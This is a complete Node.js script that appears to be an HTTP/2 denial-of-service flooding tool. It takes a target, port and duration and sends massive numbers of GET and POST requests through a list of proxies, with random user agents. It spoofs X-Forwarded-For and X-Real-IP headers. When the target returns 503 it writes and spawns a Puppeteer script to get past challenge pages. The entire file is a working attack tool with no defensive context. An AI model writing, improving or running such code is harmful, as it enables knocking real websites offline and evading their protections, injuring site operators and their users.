const fs = require("fs");
const http2 = require("http2");
const { randomBytes } = require("crypto");
const { spawn } = require("child_process");

if (process.argv.length !== 5) {
    console.log("Usage : node basic.js <url> <port> <time>");
    process.exit(1);
}

const target = process.argv[2];
const port = process.argv[3];
const duration = parseInt(process.argv[4]) * 1000;
const proxies = fs.readFileSync("proxies.txt", "utf-8").split("\n").filter(line => line.trim());
const userAgents = fs.readFileSync("ua.txt", "utf-8").split("\n").filter(line => line.trim());
const endTime = Date.now() + duration;

if (!fs.existsSync("bypass-challenge.js")) {
    fs.writeFileSync("bypass-challenge.js", `
        const puppeteer = require("puppeteer");

        (async () => {
            const url = process.argv[2];
            const proxy = process.argv[3];
            const browser = await puppeteer.launch({
                args: ['--proxy-server=http://' + proxy],
                headless: true
            });

            const page = await browser.newPage();
            try {
                await page.goto(url, { waitUntil: "domcontentloaded" });
            } catch (e) {}
            await browser.close();
        })();
    `.trim());
}

console.log(`Attack ${target} on port ${port} within ${duration / 1000} seconds.`);

process.stdin.setRawMode(true);
process.stdin.resume();
process.stdin.on("data", () => {});

function createHeaders(proxy) {
    return {
        ":method": "GET",
        ":path": "/",
        "user-agent": userAgents[Math.floor(Math.random() * userAgents.length)],
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br",
        "connection": "keep-alive",
        "cache-control": "no-cache",
        "x-forwarded-for": proxy.split(":")[0],
        "x-real-ip": proxy.split(":")[0],
    };
}

function sendFlood(proxy) {
    const client = http2.connect(`https://${target}:${port}`, {
        rejectUnauthorized: false,
    });

    const headers = createHeaders(proxy);

    const req = client.request(headers);
    req.on("response", (responseHeaders) => {
        if (responseHeaders[":status"] === 503) {
            spawn("node", ["bypass-challenge.js", target, proxy], { stdio: "ignore" });
        }
    });
    req.on("error", () => {});
    req.end();

    const postReq = client.request({
        ...headers,
        ":method": "POST",
        "content-type": "application/x-www-form-urlencoded",
    });
    postReq.on("error", () => {});
    postReq.write(`data=${randomBytes(512).toString("hex")}`);
    postReq.end();
}

function startAttack() {
    const interval = setInterval(() => {
        if (Date.now() > endTime) {
            clearInterval(interval);
            process.stdin.setRawMode(false);
            process.stdin.pause();
            console.log("Attack finished.");
            process.exit(0);
        }

        for (let i = 0; i < 100000000 / proxies.length; i++) {
            const proxy = proxies[Math.floor(Math.random() * proxies.length)];
            sendFlood(proxy);
        }
    }, 1);
}

startAttack();